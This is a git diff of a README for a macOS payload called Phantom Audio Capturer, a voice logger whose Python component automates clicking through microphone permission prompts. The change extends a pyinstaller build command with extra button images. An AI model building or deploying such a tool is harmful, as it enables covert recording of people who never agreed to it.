@@ -27,7 +27,8 @@ Phantom Audio Capturer is a macOS payload developed by Narsty and updated by Yon
 
 ## Python Script
 - The script includes a Python component that automates microphone permission handling.
-- For re-compilation: Download Voice Logger directory and run: `pyinstaller --onefile --add-data "allow_button_images/allow_button_image.jpg:allow_button_images" --add-data "allow_button_images/allow_button_image1.jpg:allow_button_images" --add-data "allow_button_images/allow_button_image2.jpg:allow_button_images" --add-data "allow_button_images/allow_button_image3.jpg:allow_button_images" allow_permission_mac.py`.
+- For re-compilation: Download Voice Logger directory and run:
+ `pyinstaller --onefile --add-data "allow_button_images/allow_button_image.jpg:allow_button_images" --add-data "allow_button_images/allow_button_image1.jpg:allow_button_images" --add-data "allow_button_images/allow_button_image2.jpg:allow_button_images" --add-data "allow_button_images/allow_button_image3.jpg:allow_button_images" --add-data "allow_button_images/allow_button_image4.jpg:allow_button_images" --add-data "allow_button_images/allow_button_image5.jpg:allow_button_images" allow_permission_mac.py`
 - The executable file will inside the dist directory
 
 ## Disclaimer
